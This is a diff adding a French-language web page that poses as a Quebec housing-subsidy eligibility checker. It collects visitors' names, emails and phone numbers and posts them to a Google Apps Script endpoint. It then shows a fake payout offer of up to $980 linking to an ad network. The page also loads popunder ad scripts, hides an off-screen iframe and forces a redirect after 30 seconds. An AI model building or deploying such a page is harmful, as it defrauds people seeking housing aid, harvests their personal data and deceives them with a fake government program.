@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Subvention Logement Québec 2025</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #121212;
+      color: #eee;
+      text-align: center;
+      padding: 40px;
+    }
+    h1 {
+      color: #00ffc8;
+    }
+    p {
+      font-size: 1.1em;
+    }
+    input[type="text"], input[type="email"], input[type="tel"] {
+      padding: 12px;
+      width: 80%;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+      background: #1e1e1e;
+      color: #fff;
+    }
+    button {
+      background: #00ffc8;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #loading {
+      display: none;
+      font-size: 1.2em;
+      color: #00ffc8;
+      margin-top: 20px;
+    }
+    #prize-popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #000;
+      border: 2px solid #00ffc8;
+      padding: 40px;
+      color: #fff;
+      z-index: 9999;
+    }
+    footer {
+      margin-top: 50px;
+      font-size: 0.8em;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <h1>Vérification d'admissibilité à la subvention logement Québec</h1>
+  <p>Inscris tes informations pour voir si tu qualifies</p>
+
+  <form id="contestForm">
+    <input type="text" name="name" placeholder="Ton nom complet" required /><br>
+    <input type="email" name="email" placeholder="Ton courriel" required /><br>
+    <input type="tel" name="phone" placeholder="Ton numéro de téléphone" required /><br>
+    <button type="submit">Vérifier mon admissibilité</button>
+  </form>
+
+  <div id="loading">
+    Vérification de ton admissibilité en cours...<br><br>
+    <span id="dots">.</span>
+  </div>
+
+  <div id="prize-popup">
+    <h2>🎉 Bonne nouvelle !</h2>
+    <p>Tu pourrais recevoir jusqu'à 980$. Vérifie ton dossier ici :</p>
+    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" style="color:#00ffc8; font-size:1.4em;">👉 Continuer</a>
+    <br><br>
+    <a href="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" style="color:#ff00cc; font-size:0.9em;">Besoin d’assistance ? Parler à un agent</a>
+  </div>
+
+  <!-- Bannière Adsterra -->
+  <script type="text/javascript">
+    atOptions = {
+      'key' : '8f0994c4b1540c759a89bf6da94ddd90',
+      'format' : 'iframe',
+      'height' : 50,
+      'width' : 320,
+      'params' : {}
+    };
+  </script>
+  <script type="text/javascript" src="//www.highperformanceformat.com/8f0994c4b1540c759a89bf6da94ddd90/invoke.js"></script>
+
+  <!-- Popunder Adsterra -->
+  <script type='text/javascript' src='//pl27053554.profitableratecpm.com/42/1d/e0/421de01cc6dead045837c47e75910be3.js'></script>
+
+  <!-- Iframe invisible -->
+  <iframe src="https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735" width="1" height="1" style="position:absolute; left:-9999px;"></iframe>
+
+  <!-- Redirection automatique après 30 secondes -->
+  <script>
+    setTimeout(function() {
+      window.location.href = "https://www.profitableratecpm.com/aw5p9a5pcq?key=f4bf0e8231317d58cec56059bd1af735";
+    }, 30000);
+  </script>
+
+  <!-- Traitement formulaire -->
+  <script>
+    const form = document.getElementById('contestForm');
+    const popup = document.getElementById('prize-popup');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const name = form.elements['name'].value;
+      const email = form.elements['email'].value;
+      const phone = form.elements['phone'].value;
+
+      form.style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+
+      fetch('https://script.google.com/macros/s/AKfycbwEJwOkGkxAZtIBZNt963pOJFORO3KjU3ONjVNsAzwYoSK-IUrhlD3iFpwd84r1aOCy/exec', {
+        method: 'POST',
+        body: JSON.stringify({ name, email, phone }),
+        headers: { 'Content-Type': 'application/json' }
+      }).then(response => {
+        setTimeout(() => {
+          document.getElementById('loading').style.display = 'none';
+          popup.style.display = 'block';
+        }, 6000);
+      });
+    });
+
+    // Animation "..."
+    let dotCount = 1;
+    setInterval(() => {
+      document.getElementById('dots').textContent = '.'.repeat(dotCount);
+      dotCount = (dotCount % 3) + 1;
+    }, 500);
+  </script>
+
+  <footer>
+    © 2025 - Programme logement Québec
+  </footer>
+</body>
+</html>
